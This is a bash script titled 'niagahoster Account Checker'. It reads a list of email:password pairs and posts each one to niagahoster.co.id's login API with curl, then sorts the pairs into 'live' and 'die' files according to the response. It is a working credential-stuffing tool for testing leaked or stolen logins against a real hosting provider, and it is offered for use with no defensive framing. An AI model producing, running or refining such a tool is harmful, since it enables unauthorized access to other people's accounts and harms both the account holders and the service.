#!/bin/bash
#niagahoster.co.id Checker
#issued on : 5 Mei 2018
#coded By Achon666ju5t
NC='\033[0m'
GREEN='\e[38;5;82m'
CYAN='\e[38;5;45m'
RED='\e[38;5;196m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
login(){
	curl -s -X POST \
--url "https://panel.niagahoster.co.id/api/guest/client/login" \
-H "origin: https://panel.niagahoster.co.id" \
-H "referer: https://panel.niagahoster.co.id/login" \
-d "email=$1&password=$2" | grep -Po "(?<=\"message\":\").*?(?=\",)"
}
header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "=========niagahoster Account Checker===========/___/======================\n"
}
clear
header
echo ""
echo "=========================================================================="
echo "List In This Directory : "
ls
echo "=========================================================================="
echo "Delimeter list -> achonxhax0r@outlook.com:password123 "
echo -n "Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
x=$(gawk -F: '{ print $1 }' $list)
y=$(gawk -F: '{ print $2 }' $list)
IFS=$'\r\n' GLOBIGNORE='*' command eval  'email=($x)'
IFS=$'\r\n' GLOBIGNORE='*' command eval  'password=($y)'
for (( i = 0; i < "${#email[@]}"; i++ )); do
    user="${email[$i]}"
    pws="${password[$i]}"
    ngecek=$(login "$user" "$pws")
    if [[ "$ngecek" = "Silakan periksa kembali detil login Anda" ]]; then
    	printf "[$i]${RED}[Die] => $user $pws\n${NC}"
        echo "$user | $pws" >> die.txt
    else
    	printf "[$i]${GREEN}[Live] => $user $pws${NC}\n"
    	echo "$user | $pws" >> live.txt
    fi
    grep -v "$user:$pws" $list >> $list.achonkjust
    mv $list.achonkjust $list
done
echo "Silakan Login => https://panel.niagahoster.co.id/login "
